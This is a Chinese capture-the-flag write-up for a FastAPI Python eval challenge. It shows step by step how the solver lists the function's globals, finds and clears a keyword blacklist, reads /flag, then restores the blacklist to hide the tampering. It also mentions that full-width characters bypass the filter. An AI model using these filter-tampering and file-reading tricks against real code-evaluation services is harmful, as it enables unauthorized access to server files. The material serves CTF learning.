## 题目名称
fastapi2

## 题目描述
师傅们都太强了，这次决定加大力度。

hint: 为了防止偷看我把变量都改了名字，还把关键词的黑名单挪到了函数外。

## 出题/解题思路
```
list(calc.__globals__)
{
  "res": [
    "__name__",
    "__doc__",
    "__package__",
    "__loader__",
    "__spec__",
    "__annotations__",
    "__builtins__",
    "__file__",
    "__cached__",
    "Optional",
    "FastAPI",
    "Form",
    "uvicorn",
    "app",
    "hello",
    "youdontknow",
    "calc"
  ],
  "err": false
}

youdontknow
{
  "res": [
    "import",
    "open",
    "eval",
    "exec",
    "class",
    "'",
    "\"",
    "vars",
    "str",
    "chr"
  ],
  "err": false
}

youdontknow.clear()

open("/flag").read()

youdontknow=["import","open","eval","exec","class","'","\"","vars","str","chr"]

```

非预期：全角字符绕过一切关键词

## flag
